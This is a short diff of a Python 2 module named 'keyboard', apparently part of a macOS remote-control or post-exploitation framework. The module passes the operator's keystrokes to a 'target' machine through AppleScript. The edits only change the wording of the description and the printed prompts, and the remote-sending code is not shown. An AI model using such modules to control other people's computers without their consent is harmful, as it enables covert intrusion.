@@ -19,14 +19,14 @@ except ImportError:
 class command:
     def __init__(self):
         self.name = "keyboard"
-        self.description = "your keyboard -> is target's keyboard"
+        self.description = "Your keyboard -> is target's keyboard."
         self.type = "applescript"
         self.id = 115
 
     def run(self,session,cmd_data):
         #do something with conn if you want
-        print "type CTRL c to quit"
-        print "start typing..."
+        print "type CTRL+C to quit..."
+        print "Start typing..."
         while 1:
             key = getch()
             if key == chr(03):
